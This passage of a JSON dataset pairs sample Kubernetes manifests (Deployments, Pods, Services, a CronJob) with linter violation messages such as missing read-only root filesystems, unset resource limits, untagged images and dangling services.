env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "1791",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "1792",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"frontend-check\" has cpu request 0"
  },
  {
    "id": "1793",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"frontend-check\" has memory limit 0"
  },
  {
    "id": "1794",
    "manifest_path": "data/manifests/the_stack_sample/sample_0376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "1795",
    "manifest_path": "data/manifests/the_stack_sample/sample_0376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-foghorn\" not found"
  },
  {
    "id": "1796",
    "manifest_path": "data/manifests/the_stack_sample/sample_0376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "1797",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "1798",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "1799",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "1800",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "1801",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "1802",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1803",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "1804",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "1805",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "1806",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "1807",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "1808",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "1809",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "1810",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "1811",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"fio\" is using an invalid container image, \"nixery.dev/shell/fio/tini\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1812",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fio\" does not have a read-only root file system"
  },
  {
    "id": "1813",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fio\" is not set to runAsNonRoot"
  },
  {
    "id": "1814",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fio\" has cpu request 0"
  },
  {
    "id": "1815",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fio\" has memory limit 0"
  },
  {
    "id": "1816",
    "manifest_path": "data/manifests/the_stack_sample/sample_0384.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: svc-delete-backend\n  labels:\n    app: svc-delete-backend\nspec:\n  selector:\n    app: svc-delete-backend\n  ports:\n  - protocol: TCP\n    port: 5004\n    targetPort: 5004\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:svc-delete-backend])"
  },
  {
    "id": "1817",
    "manifest_path": "data/manifests/the_stack_sample/sample_0385.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: kube-annotate\n  name: kube-annotate\nspec:\n  type: ClusterIP\n  ports:\n  - name: https\n    port: 443\n    targetPort: https\n  selector:\n    app: kube-annotate\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kube-annotate])"
  },
  {
    "id": "1818",
    "manifest_path": "data/manifests/the_stack_sample/sample_0386.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cos\n  labels:\n    app.kubernetes.io/component: cos\n    app.kubernetes.io/instance: cos\n    app.kubernetes.io/name: cos\n    app.kubernetes.io/part-of: cos\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: cos\n      app.kubernetes.io/instance: cos\n      app.kubernetes.io/name: cos\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: cos\n        app.kubernetes.io/instance: cos\n        app.kubernetes.io/name: cos\n    spec:\n      containers:\n      - image: nginx:1.20-alpine\n        name: cos\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 100m\n            memory: 256Mi\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cos\" does not have a read-only root file system"
  },
  {
    "id": "1819",
    "manifest_path": "data/manifests/the_stack_sample/sample_0386.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cos\n  labels:\n    app.kubernetes.io/component: cos\n    app.kubernetes.io/instance: cos\n    app.kubernetes.io/name: cos\n    app.kubernetes.io/part-of: cos\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: cos\n      app.kubernetes.io/instance: cos\n      app.kubernetes.io/name: cos\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: cos\n        app.kubernetes.io/instance: cos\n        app.kubernetes.io/name: cos\n    spec:\n      containers:\n      - image: nginx:1.20-alpine\n        name: cos\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 100m\n            memory: 256Mi\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cos\" is not set to runAsNonRoot"
  },
  {
    "id": "1820",
    "manifest_path": "data/manifests/the_stack_sample/sample_0390.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: user-memcached\nspec:\n  type: ClusterIP\n  ports:\n  - name: '11211'\n    port: 11211\n    targetPort: 11211\n  selector:\n    service: user-memcached\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:user-memcached])"
  },
  {
    "id": "1821",
    "manifest_path": "data/manifests/the_stack_sample/sample_0391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: restplus-kubernetes-service\nspec:\n  selector:\n    app: restplus-kubernetes\n  type: NodePort\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:restplus-kubernetes])"
  },
  {
    "id": "1822",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
